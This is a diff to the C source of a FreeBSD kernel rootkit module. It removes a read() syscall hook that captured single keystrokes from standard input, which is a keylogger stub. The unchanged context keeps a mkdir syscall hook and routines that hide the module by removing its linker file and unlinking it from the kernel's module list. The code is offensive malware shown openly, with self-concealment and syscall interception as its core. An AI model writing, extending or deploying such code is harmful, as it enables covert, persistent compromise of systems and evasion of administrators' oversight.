@@ -27,13 +27,11 @@ load(struct module *module, int cmd, void *arg)
 		case MOD_LOAD:
 			LOGI("[rootkit:load] Rootkit loaded.\n");
 			toggle_hook(ON, SYS_mkdir, mkdir_hook);
-			toggle_hook(ON, SYS_read, read_hook);
 			remove_linker_file("rootkit.ko");
 			remove_module_from_kernel("rootkit");
 			break;
 		case MOD_UNLOAD:
 			toggle_hook(OFF, SYS_mkdir, sys_mkdir);
-			toggle_hook(OFF, SYS_read, sys_read);
 			LOGI("[rootkit:load] Rootkit unloaded.\n");
 			break;
 		default:
@@ -66,27 +64,6 @@ mkdir_hook(struct thread *td, void *syscall_args) {
 	}
 
 	return(sys_mkdir(td, syscall_args));
-}
-
-int
-read_hook(struct thread *td, void *syscall_args)
-{
-	struct read_args *uap;
-	uap = (struct read_args *) syscall_args;
-
-	int error;
-	char buf[1];
-	int done;
-
-	error = sys_read(td, syscall_args);
-
-	if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
-	{
-		return(error);
-	}
-
-	copyinstr(uap->buf, buf, 1, &done);
-	return(error);
 }
 
 void
@@ -172,12 +149,5 @@ static moduledata_t mkdir_hook_mod = {
 	NULL
 };
 
-static moduledata_t read_hook_mod = {
-	"read_hook",
-	load,
-	NULL
-};
-
-DECLARE_MODULE(read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
 DECLARE_MODULE(mkdir_hook, mkdir_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
 DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
